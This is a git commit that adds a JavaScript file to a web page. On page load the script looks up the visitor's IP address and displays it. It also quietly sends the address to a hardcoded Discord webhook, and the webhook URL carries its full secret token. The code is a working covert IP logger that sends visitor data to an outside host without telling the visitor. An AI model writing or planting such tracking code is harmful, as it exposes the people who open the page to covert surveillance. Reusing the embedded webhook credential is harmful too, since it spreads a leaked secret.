670439a2ab7f539f810428a350d49c030a897b74
SebaCoderS <142695893+SebaCoderS@users.noreply.github.com>
2025-02-21 22:26:54 +0100

    s

---
+++ script.js
@@ -0,0 +1,37 @@
+document.addEventListener("DOMContentLoaded", function() {
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            console.log("Your IP address is: ", data.ip);
+            document.getElementById('ip-address').textContent = data.ip;
+            sendToDiscord(data.ip);
+        })
+        .catch(error => {
+            console.error('Error fetching IP:', error);
+            document.getElementById('ip-address').textContent = 'Errore nel recupero dell\'IP';
+        });
+});
+
+function sendToDiscord(ip) {
+    const webhookUrl = 'https://discordapp.com/api/webhooks/1342604141029097574/x3GiqzW6zOjKElWy_LJU6Q5ixpttu7cX6xpiRMjqyUpnNsZq3Uq0g5V2vlaqoUTYJ8ap'; // Sostituisci con l'URL della tua webhook
+
+    const message = {
+        content: `L'indirizzo IP dell'utente è: ${ip}`
+    };
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(message)
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('Messaggio inviato al bot di Discord');
+        } else {
+            console.error('Errore nell\'invio del messaggio al bot di Discord');
+        }
+    })
+    .catch(error => console.error('Errore nella richiesta alla webhook di Discord:', error));
+}
